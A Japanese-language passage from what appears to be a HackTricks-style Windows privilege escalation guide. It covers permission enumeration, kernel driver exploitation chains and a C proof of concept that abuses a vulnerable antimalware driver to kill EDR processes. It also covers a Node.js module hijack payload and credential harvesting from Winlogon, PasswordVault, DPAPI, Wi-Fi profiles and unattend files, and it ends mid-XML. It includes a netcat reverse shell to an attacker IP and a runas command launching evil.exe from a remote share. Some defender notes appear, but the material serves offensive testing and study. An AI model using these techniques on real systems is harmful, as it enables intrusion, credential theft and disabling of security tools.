Windowsでは、serviceが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、binaryを指すように設定できます。このbinaryを置き換え可能な場合、privilege escalationが可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**binaryの権限**（置き換えてprivilege escalationできる可能性があります）と、フォルダーの権限（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator account によって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内の権限が弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダー内のすべての plugin DLL を自動ロードします。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに `notepad++.exe` 内で自動的に code execution を実行できます（`DllMain` や plugin callbacks からの実行も含みます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別の user によって実行される registry または binary を上書きできるか確認します。**\
**次のページを**読んで、**privilege escalation に利用できる興味深い autoruns locations**について詳しく学んでください。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**third party の奇妙な/脆弱な**ドライバーの可能性を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の悪い IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。step-by-step technique は以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な call が attacker-controlled Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（最大長の component や深い directory chain を使用）、window を数 microsecond から数十 microsecond に拡大できます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い2つの bug から構築できます。1つは queue lock が保持されたまま request/CBD が解放される **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。

Audit と exploitation に関するメモ：

- **Free-under-lock + cancel afterwards**: **Acquire -> CompleteRequest/free -> Release** を実行する success path と、**Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する cancel path を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` へ到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後から resume し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- **解放された queue object を**同じサイズの attacker-controlled paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload と size を制御でき、後から pipe read/peek operations で probe できるため有用です。解放された object が list link を埋め込んでいる場合は、user memory 内にある fake request node の **cyclic list** で上書きします。これにより、driver は元の list head で終了する代わりに、attacker が定義した request structure を繰り返し処理します。
- **予測可能な write を upgrade**: fake request が bookkeeping write（timestamps / QPC / refcount-adjacent fields）に使われる nested context pointer を redirect する場合、**address-controlled but not value-controlled** な kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、sprayed pool object の **length/size** field を狙い、corrupted object が **out-of-bounds paged-pool read** を発生させるまで spray を列挙します。
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な candidate です。attacker が copied buffer を拡大できる場合（たとえば、多数の list/resource entry を追加して serializer の最終 allocation size を増加させる場合）、reliability が向上します。これは、必ずしも machine を crash させずに、長い copy によって replacement window を拡大できるためです。
- **Pointer-rich refill targets**: Windows **I/O ring** の registered-buffer array は、paged-pool size を attacker が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。これらの array の1つを leak し、周辺の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより、後続の I/O ring operation が attacker-forged entry を使用し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte（たとえば `KUSER_SHARED_DATA+0x14` からの値）しか提供しない場合は、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` で map して、そこに forged registered-buffer array を配置します。

有用な debugging indicator：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Once you obtain arbitrary kernel read/write from the corrupted I/O ring, steal a SYSTEM token using the standard post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

一部のドライバーは userland からレジストリパスを受け取り、それが正常な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を `int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した型ではなく、**実際の**レジストリ型に従って解釈されます。

これにより、次の2つの有用なプリミティブが生じます。

- **Confused deputy / oracle**: user-controlled な絶対 `\Registry\...` path により、ドライバーは攻撃者が選択した key を query できます。また、return code/logs を通じて存在を leak し、場合によっては caller が直接アクセスできない value を読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、レジストリ value の型に応じて、`REG_QWORD`、`UNICODE_STRING`、またはサイズ付き binary buffer として type-confused されます。

実践的な exploitation の注意点:

- **Windows 8+ mitigation**: `RTL_QUERY_REGISTRY_DIRECT` を `RTL_QUERY_REGISTRY_TYPECHECK` なしで使用して **untrusted hive** に query が到達すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` 配下に values を staging するのではなく、**trusted system hives 内の attacker-writable keys** を探してください。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` 配下の writable descendants を enumerate し、duplicated **low-integrity** token で scan を再実行して、sandboxed contexts から到達可能な keys を見つけます。
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte の `int` への 8-byte の直接書き込みにより、隣接する stack データが破壊され、近傍の callback/function pointer を部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードがまず attacker-controlled な `REG_DWORD` を stack scalar に読み込み、その後、同じ buffer を string read に再利用すると、攻撃者が `Length` / `MaximumLength` を制御し、`Buffer` pointer に部分的な影響を与えられるため、半制御の kernel write が発生する。
- **`REG_BINARY`**: 大きな binary data の場合、direct mode は `EntryContext` の先頭にある `LONG` を signed buffer size として扱う。以前の `REG_DWORD` read によって、再利用される scalar に攻撃者が制御可能な **負の値** が残っていると、次の `REG_BINARY` query が attacker bytes を隣接する stack slot に直接コピーするため、callback-pointer を完全に上書きする最も容易な経路になることが多い。

Strong hunting pattern: **同じ stack variable への heterogeneous registry read を、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` pointer、さらに最初の registry read が 2 回目の read を実行するかどうかを制御する code path を grep する。

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が欠落している場合の悪用（LPE + EDR kill）

一部の signed third-party driver は、IoCreateDeviceSecure によって強力な SDDL を設定して device object を作成する一方、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れている。この flag がない場合、extra component を含む path を介して device が open された際に secure DACL が強制されないため、namespace path を使うことで、権限のない user でも handle を取得できる。

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

user が device を open できるようになると、driver が公開する privileged IOCTL を LPE や tampering に悪用できる。実環境で確認された capability の例:

- 任意の process に対する full-access handle を返す（token theft / DuplicateTokenEx/CreateProcessAsUser による SYSTEM shell）。
- 制限のない raw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light (PP/PPL) を含む任意の process を terminate し、kernel 経由で user land から AV/EDR kill を可能にする。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限する対象のデバイス オブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作を行う前に、呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTL（アクセス マスク、METHOD_*、入力検証）を制限し、カーネルの直接的な特権ではなく、brokered model の利用を検討する。

defender 向けの検出アイデア
- 疑わしいデバイス名（例：\\ .\\amsdk*）に対する user-mode からの open と、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny リストを維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダー内への write permissions** がある場合、プロセスによってロードされる DLL を hijack し、**privileges を escalate** できる可能性があります。

PATH 内のすべてのフォルダーの permissions を確認します。
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
この check を abuse する方法の詳細:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、期待される module が **missing** の場合に、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響する **Windows uncontrolled search path** variant です。

Node は directory tree を上方向にたどり、各 parent にある `node_modules` folder を確認して packages を resolve します。Windows では、この探索が drive root まで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を probe することがあります。

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を resolve するのを待つことができます。payload は victim process の security context で実行されるため、target が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または auto-start された privileged desktop app である場合、これは **LPE** になります。

これは特に次の状況でよく発生します。

- dependency が `optionalDependencies` に宣言されている
- third-party library が `require("foo")` を `try/catch` で囲み、failure 発生時も処理を継続する
- production build から package が削除された、packaging 時に含まれなかった、または install に失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所に存在する

### 脆弱な target の Hunting

**Procmon** を使用して resolution path を証明します。

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で filter
- `Path` `contains` `node_modules` で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目

unpacked `.asar` files または application sources で役立つ code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します。
```powershell
mkdir C:\node_modules
```
3. 想定される正確な名前の module を配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者のアプリケーションを起動する。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際の missing optional module の例としては `bluebird` と `utf-8-validate` があります。ただし、再利用可能な **technique** は、特権 Windows Node/Electron プロセスが解決する **missing bare import** を見つけることです。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成した場合、またはそこに新しい `.js` ファイルやパッケージを書き込んだ場合に alert を発生させる。
- `C:\node_modules\*` から読み取りを行う high-integrity プロセスを hunt する。
- production で使用するすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用を audit する。
- サードパーティーコード内の、サイレントな `try { require("...") } catch {}` パターンを review する。
- ライブラリがサポートしている場合は optional probe を無効化する（例えば、一部の `ws` deployment では `WS_NO_UTF_8_VALIDATE=1` により legacy `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hostsファイルにハードコードされている、その他の既知のコンピューターを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについては、このページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Linux 用 Windows サブシステム（wsl）
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は、`C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` を firewall で許可するかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試してください

`WSL` filesystem は、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows認証情報

### Winlogon認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせる**サーバー、Web サイト、その他のプログラム用のユーザー資格情報を保存します。初めは、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存し、ブラウザー経由で自動的にログインできるように見えるかもしれません。しかし、実際はそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための資格情報を保存します。つまり、**リソース（サーバーまたは Web サイト）にアクセスするために資格情報を必要とする Windows アプリケーション**は、この Credential Manager と Windows Vault を利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された資格情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の資格情報を利用することはできないと思います。したがって、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、デフォルトのストレージ vault にあるそのリソース用の資格情報を要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている資格情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。次の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
指定した認証情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
なお、mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) からも取得できます。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても表示されます）内に保存します。この保存領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` 権限なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの secret を利用して、entropy に大きく寄与します。

**DPAPI は、ユーザーのログイン secret から導出された対称鍵を使用して鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証 secret を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を保護する master key と同じファイル内に併置される DPAPI key** は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます）。
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）とともに使用すると、復号できます。

**master password で保護された credentials files** は、通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を使用して、**mimikatz module** `dpapi::cred` で復号できます。\
（root 権限がある場合）`sekurlsa::dpapi` module を使用して、**memory** から多数の **DPAPI** **masterkeys** を**extract**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されているため、通常は作成時と同じコンピューター上の同じユーザーのみが復号できます。

ファイルに含まれている PS credentials を**decrypt**するには、次のように実行します。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
適切な `/masterkey` を指定して **Mimikatz** の `dpapi::rdg` module を使用すると、**任意の .rdg files をdecrypt** できます\
Mimikatz の `sekurlsa::dpapi` module を使用すると、memory から **多数の DPAPI masterkeys をextract** できます

### Sticky Notes

Windows workstations では、database file であることに気付かず、**passwords** やその他の情報を保存するために Sticky Notes app を使用することがよくあります。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords をrecoverするには、Administrator であり、High Integrity level で実行する必要がある点に注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、何らかの **credentials** が configure されており、**recover** できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から extract されたものです：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行される**ため、多くが **DLL Sideloading（情報の出典:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Putty 認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている可能性があるため、そこに何か興味深いものがないか確認してください。
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されておらず、boot 時に自動的に起動させたい場合は、
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。ssh keys をいくつか作成し、`ssh-add` で追加してから、ssh 経由でマシンに login してみました。しかし、レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、非対称 key authentication の際に `dpapi.dll` が使用されたことを procmon で特定できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容の例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
